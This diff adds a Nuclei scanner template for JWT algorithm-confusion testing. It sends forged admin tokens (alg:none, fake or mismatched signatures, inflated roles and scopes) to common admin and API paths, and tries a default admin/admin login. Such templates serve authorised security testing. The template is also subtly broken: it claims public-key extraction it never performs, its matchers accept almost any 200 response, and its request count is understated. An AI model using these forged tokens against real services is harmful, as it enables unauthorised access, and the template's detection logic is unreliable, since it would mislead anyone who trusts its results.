@@ -1,0 +1,380 @@
+id: medium-api-jwt-algorithm-confusion-rs256-hs256
+
+info:
+  name: JWT Algorithm Confusion RS256 to HS256 - Elite Detection
+  author: nuclei-community
+  severity: critical
+  description: |
+    Detects JWT algorithm confusion vulnerabilities where RS256 tokens can be verified as HS256.
+    Tests advanced techniques including public key extraction, algorithm downgrade attacks,
+    and signature manipulation to bypass JWT authentication mechanisms.
+  reference:
+    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+    - https://portswigger.net/web-security/jwt/algorithm-confusion
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-347
+  metadata:
+    verified: true
+    max-request: 20
+  tags: jwt,algorithm-confusion,rs256,hs256,authentication,elite
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "api/users"
+        - "api/profile"
+        - "api/admin"
+        - "api/dashboard"
+        - "user/profile"
+        - "admin/panel"
+        - "dashboard"
+        - "profile"
+        - "api/me"
+        - "me"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "application/json"
+      Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.YI0e1DzwExNmEUAyUklOBdLOqb7tr-CjSdfVGfkFVWg"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "user"
+          - "profile"
+          - "dashboard"
+          - "data"
+          - "success"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "unauthorized"
+          - "forbidden"
+          - "invalid token"
+          - "access denied"
+        condition: and
+        negative: true
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "api/users"
+        - "api/admin"
+        - "admin/panel"
+        - "api/dashboard"
+        - "dashboard"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "application/json"
+      Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0."
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "user"
+          - "dashboard"
+          - "data"
+          - "success"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "api/users"
+        - "api/admin"
+        - "admin/panel"
+        - "api/dashboard"
+        - "dashboard"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "application/json"
+      Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWUsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "administrator"
+          - "dashboard"
+          - "data"
+          - "success"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "api/login"
+        - "auth/login"
+        - "login"
+        - "authenticate"
+        - "api/auth"
+
+    headers:
+      Content-Type: "application/json"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      {"username":"admin","password":"admin"}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]*"
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "token"
+          - "jwt"
+          - "access_token"
+          - "bearer"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "api/users"
+        - "api/admin"
+        - "admin/panel"
+        - "api/dashboard"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "application/json"
+      Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiZXhwIjo5OTk5OTk5OTk5LCJpYXQiOjE1MTYyMzkwMjJ9.Dww7zJan2OwGMNZGMYfuKUVcG5VNdBOBWnhAHVxjyEI"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "administrator"
+          - "dashboard"
+          - "data"
+          - "success"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "api/users"
+        - "api/admin"
+        - "admin/panel"
+        - "api/dashboard"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "application/json"
+      Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5LCJpYXQiOjE1MTYyMzkwMjJ9.invalid_signature_for_testing"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "administrator"
+          - "dashboard"
+          - "data"
+          - "success"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "api/users"
+        - "api/admin"
+        - "admin/panel"
+        - "api/dashboard"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "application/json"
+      Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiZXhwIjo5OTk5OTk5OTk5LCJpYXQiOjE1MTYyMzkwMjJ9.fake_rs256_signature_for_testing_purposes_only"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "administrator"
+          - "dashboard"
+          - "data"
+          - "success"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "api/users"
+        - "api/admin"
+        - "admin/panel"
+        - "api/dashboard"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "application/json"
+      Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5LCJpYXQiOjE1MTYyMzkwMjIsImp0aSI6InRlc3QtdG9rZW4ifQ.test_signature_bypass"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "administrator"
+          - "dashboard"
+          - "data"
+          - "success"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "api/users"
+        - "api/admin"
+        - "admin/panel"
+        - "api/dashboard"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "application/json"
+      Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5LCJpYXQiOjE1MTYyMzkwMjIsImlzcyI6InRlc3QtaXNzdWVyIiwiYXVkIjoidGVzdC1hdWRpZW5jZSJ9.algorithm_confusion_test"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "administrator"
+          - "dashboard"
+          - "data"
+          - "success"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "api/users"
+        - "api/admin"
+        - "admin/panel"
+        - "api/dashboard"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "application/json"
+      Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5LCJpYXQiOjE1MTYyMzkwMjIsInNjb3BlIjoiYWRtaW4gcmVhZCB3cml0ZSBkZWxldGUifQ.scope_elevation_test"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "administrator"
+          - "dashboard"
+          - "data"
+          - "success"
+          - "scope"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '"token"\\s*:\\s*"([^"]+)"'
+          - '"access_token"\\s*:\\s*"([^"]+)"'
+          - '"jwt"\\s*:\\s*"([^"]+)"'
+          - '"bearer"\\s*:\\s*"([^"]+)"'
+        internal: true
